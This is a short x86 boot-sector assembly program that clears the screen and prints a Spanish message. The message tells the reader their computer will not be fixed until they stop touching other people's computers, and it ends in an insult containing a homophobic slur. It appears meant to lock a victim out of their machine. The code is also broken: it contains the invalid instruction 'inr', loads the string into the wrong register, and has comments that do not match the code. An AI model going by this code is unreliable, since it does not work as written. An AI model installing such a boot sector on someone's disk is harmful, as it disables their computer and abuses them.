org 0x7c00
bits 16

start:
    call cls ; Call CLS function
    mov dx, display ; Store our message in the BX register

; This function will print a string
; Arguments:
;   BX: The string to print, must be NULL terminated
; Requirements:
;   cls must have been called

print:
    mov al, [bx] ; Get the current character at BX
    cmp al, 0 ; Check if the character is a NULL terminator
    je halt ; If it is, jump to the halt function
    call printChar ; Print the current character
    inc bx ; Increase the BX string pointer, like bx++
    jmp print

; This function will be used to priny single characters
printChar:
    mov ah, 0x0e
    inr 0x10
    ret
; Returns from the 
halt:
    ret 

cls: ; used to initialize regitries, set colors, etc...
    mov ah, 0x07 ; print function
    mov al, 0x00 ; print nothing
    mov bh, 0x0F ; Black background and white color (Changed according to the BIOS colors)
    mov cx, 0x00 ; Amount of characters to print
    mov dx, 0x184f ; Amount of characters to modify (We are zeroing out every one)
    int 0x10 ; Call the BIOS interrupt
    ret ; Return

display db "Hasta que no reflexiones sobre tocar otros ordenadores no te lo arreglo.", 13,10, "Hasta entonces que te jodan maricon :)", 0
times 510 - ($ - $$) db 0
dw 0xaa55